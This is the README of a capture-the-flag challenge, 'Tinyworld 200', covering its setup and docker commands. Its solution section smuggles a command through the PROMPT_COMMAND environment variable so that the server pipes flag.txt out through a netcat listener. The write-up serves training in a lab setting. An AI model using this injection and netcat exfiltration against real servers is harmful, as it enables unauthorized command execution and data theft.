# Tinyworld 200

In this challenge, competitors are provided with an anonymous SSH to a server under the username challenge@addr -P 2222 where when they log in they are presented with a prompt that will let them run any 5 character command with no special characters and set some environment variables, but not let them receive any output back from any of their commands.

## Solution

Run a server on your machine (replace localhost with the IP of the host where tinyworld.py is located)

    while true; do nc localhost 2050; done

ssh into the challenge box and run the following commands

    Give me an env key: PROMPT_COMMAND
    Give me an env value: eval cat flag.txt | nc -l -p 2050
    Give me a 5 char cmd: asdaa

The challenge box will then bind to port 2050 and brodcast the key for a short period of time and then exit. Note that competitors will need to perform a port scan in order to figure out which ports are actually available to bind to.

## Building/Running the Challenge

    docker build -t tinyworld-200 .

    docker run -d -p 2222:22 -p 2000-2100:2000-2100 --read-only --tmpfs /tmp tinyworld-200